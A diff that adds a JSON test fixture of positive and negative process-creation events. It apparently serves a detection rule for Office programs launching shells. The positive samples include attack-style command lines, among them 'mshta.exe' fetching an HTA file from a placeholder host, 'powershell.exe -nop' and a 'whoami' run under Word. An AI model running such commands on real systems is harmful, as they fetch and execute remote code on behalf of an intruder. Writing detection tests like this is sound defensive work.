@@ -1,0 +1,12 @@
+{
+  "positive": [
+    {"ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "Image": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c whoami"},
+    {"ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -nop"},
+    {"ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", "Image": "C:\\Windows\\System32\\mshta.exe", "CommandLine": "mshta.exe http://example.invalid/a.hta"}
+  ],
+  "negative": [
+    {"ParentImage": "C:\\Windows\\explorer.exe", "Image": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe"},
+    {"ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "Image": "C:\\Windows\\System32\\splwow64.exe", "CommandLine": "splwow64.exe 12288"},
+    {"Image": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe"}
+  ]
+}
